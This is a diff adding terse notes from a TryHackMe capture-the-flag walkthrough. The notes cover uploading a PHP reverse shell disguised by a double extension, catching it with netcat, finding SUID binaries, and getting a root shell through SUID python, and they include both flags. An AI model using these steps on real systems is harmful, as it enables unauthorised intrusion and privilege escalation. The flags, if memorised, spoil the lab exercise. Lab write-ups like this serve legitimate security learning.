@@ -1,0 +1,12 @@
+upload a php reverse shell in the panel page in disguise as rev.html5.php5
+netcat it on the port 1234 
+user flag ::THM{y0u_g0t_a_sh3ll}
+
+check the SUID binaries for possible privilage escalations 
+find / -perm -u=s 2>/dev/null
+found python
+/usr/bin/python
+search in gtfobins and find the exploit 
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+got the root access 
+root flag :: THM{pr1v1l3g3_3sc4l4t10n} 
